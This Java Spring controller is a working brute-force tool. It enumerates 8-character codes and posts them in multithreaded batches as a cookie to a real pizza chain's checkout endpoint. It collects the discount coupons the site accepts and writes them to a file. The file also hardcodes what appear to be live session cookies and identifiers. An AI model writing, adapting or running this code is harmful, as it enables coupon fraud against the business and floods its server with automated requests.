package com.example.test;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;


import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.logging.Logger;

import static org.springframework.http.HttpStatus.NO_CONTENT;

@RestController
public class GreetingsController {
    private static final Logger LOGGER = Logger.getLogger( GreetingsController.class.getName() );


    List<String> stringsSet = new ArrayList<>();
    List<String> coupons = new ArrayList<>();
    int counterHundred = 1;
    AtomicInteger requestSentCounter = new AtomicInteger(1);

    @GetMapping("/rest/download/{fileId}")
    public ResponseEntity<Void> tryTicket() throws IOException {
        createFile();
        var set2 = Arrays.asList('l', 'q', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'a', 'm', 'n', 'p', 'b', 'r', 'o', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0');
        var k = 8;
        ExecutorService executorService = Executors.newFixedThreadPool(40);
        Runnable task = () -> {
            while(true) {
                try {
                    Thread.sleep(10000);
                    LOGGER.info("Requests sent :" + requestSentCounter.get());
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        };
        executorService.submit(task);
        printAllKLength(set2, k, executorService);
        executorService.shutdown();


        return new ResponseEntity<>(NO_CONTENT);
    }

    public void send(String headerCoupons) throws IOException {


        Connection.Response res = Jsoup.connect("https://www.dominos.bg/new/ajax/order.php")
                .header("accept", "*/*")
                .header("accept-language", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "Dominos_C_Lang=bg; PHPSESSID=m5btai6h6p19722vtrpp6uc6u0; _gcl_au=1.1.1590048803.1631268838; _ga=GA1.2.2122116502.1631268838; _gid=GA1.2.1228060729.1631268838; _fbp=fb.1.1631268838810.12867522; MicrosoftApplicationsTelemetryDeviceId=9912ef75-accf-4089-98fb-065af68242aa; MicrosoftApplicationsTelemetryFirstLaunchTime=2021-09-10T10:14:00.888Z; __zlcmid=160kJwIPYQjSGut; Customer_Dominos=160f4d82a045f0f43ddea89a4f4b1576ac4dfc776208ec79b81285d2d7490abc8cbb3d4f74faa75d8044fc3ebdd42ceece25a76abba99c8090aa2870960900f2; KeepAlive=de6eaf948ba6acbce52600e7e4aa4e4ed058ee8e64f9f5323f6c6a3a0857f25e357a8ba7a1e26a156bd62909c1b3d78b43f8e014c0f21a297e232024c6065e16; Order_data=%7B%22store_id%22%3A%2254%22%2C%22address_id%22%3A0%2C%22delivery_method%22%3A%22C%22%2C%22time%22%3A%2217%3A50%22%2C%22store_perma%22%3A%22sofia-mladost%22%7D; Toppings=%5B%7B%22product%22%3A%22511%22%2C%22toppings%22%3A%5B%7B%221%22%3A%221%22%2C%223%22%3A%221%22%2C%2222%22%3A%221%22%2C%2231%22%3A%221%22%7D%5D%2C%22specs%22%3A%5B%2222308%22%5D%7D%5D; Basket=%7B%2254%22%3A%7B%22combo%22%3A%5B%5D%2C%22catering%22%3A%5B%5D%2C%22normal%22%3A%5B%7B%22ids%22%3A%5B%2222308%22%5D%2C%22quantity%22%3A1%2C%22toppings%22%3A%5B%7B%221%22%3A%221%22%2C%223%22%3A%221%22%2C%2222%22%3A%221%22%2C%2231%22%3A%221%22%7D%5D%2C%22comments%22%3A%22%22%2C%22favorite%22%3A%22%22%7D%5D%7D%7D; Coupons=" + headerCoupons + "; _gat=1")
                .header("origin", "https://www.dominos.bg")
                .header("referer", "https://www.dominos.bg/checkout")
                .header("sec-ch-ua", "Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .data("address_id", "0")
                .data("time", "17:50")
                .data("time_type", "LATER")
                .data("store_id", "54")
                .data("delivery_method", "C")
                .data("show_basket", "showLast").method(Connection.Method.POST)
                .execute();


        Document doc = res.parse();
        Elements eles = doc.getElementsByClass("yellow-border");
        Elements elesWrong = doc.getElementsByClass("red-border");
        if(elesWrong.size() < 90) {
            LOGGER.info("Request sent :" + requestSentCounter.get() + " , w=" + elesWrong.size() + " , h=" + headerCoupons);
        }
        //LOGGER.info("Request sent :" + requestSentCounter.get() + " , w=" + elesWrong.size() + " , h=" + headerCoupons);
        for (Element element : eles) {
            String asd = element.child(0).childNode(0).toString();
            LOGGER.info("WIN!!!!!!!!!!!!!!!: " + asd);
            try {
                Files.write(Paths.get("coup.txt"), asd.getBytes(), StandardOpenOption.APPEND);
            }catch (IOException e) {
                //exception handling left as an exercise for the reader
            }
            coupons.add(asd);
        }
        requestSentCounter.getAndIncrement();
    }


    protected void printAllKLength(List<Character> set, int k, ExecutorService executorService) throws IOException {
        var n = set.size();
        printAllKLengthRec(set, "", n, k, executorService);
    }


    public void printAllKLengthRec(List<Character> set, String prefix, int n, int k, ExecutorService executorService) throws IOException {

        if (k == 0)
        {
                if(Character.isDigit(prefix.charAt(0)) || Character.isDigit(prefix.charAt(7)) || !prefix.matches("^\\D*\\d\\D*$")) {
                    return;
                }
                stringsSet.add(prefix);

                if(counterHundred++ == 99) {
                    var header = generateHeaderString();
                    stringsSet.clear();
                    counterHundred = 0;

                    Runnable task = () -> {
                        try {
                            send(header);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                    /*    try {
                            Thread.sleep(250);
                            requestSentCounter.getAndIncrement();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }*/
                    };
                    executorService.submit(task);
                }


            return;
        }


        for (var i = 0; i < n; ++i)
        {
            if(prefix.isEmpty() && Character.isDigit(set.get(i))) {
                continue;
            }

            if(!prefix.isEmpty() && prefix.contains(set.get(i).toString()))
               continue;

            if(!prefix.isEmpty() && prefix.matches("^\\D*\\d\\D*$") && Character.isDigit(set.get(i))){
                continue;
            }

            var newPrefix = prefix + set.get(i);

            printAllKLengthRec(set, newPrefix,
                    n, k - 1, executorService);
        }
    }

    public static boolean check(String g) {
        for (int i = 0; i < g.length(); i++) {
            for (int j = i + 1; j < g.length(); j++) {
                if (g.charAt(i) == g.charAt(j)) {
                    return true;
                }
            }
        }
        return false;
    }

    public String generateHeaderString() {
        StringBuilder sb = new StringBuilder();
        sb.append("%5B%22");
        for(var i = 0; i < stringsSet.size(); i++) {

            sb.append(stringsSet.get(i));
            if (i < stringsSet.size()-1) {
                sb.append("%22%2C%22");
            } else {
                sb.append("%22%5D");
            }

        }

        return sb.toString();
    }

    public void createFile()
            throws IOException {
        String str = "Hello";
        BufferedWriter writer = new BufferedWriter(new FileWriter("coup.txt"));
        writer.write(str);

        writer.close();
    }
}
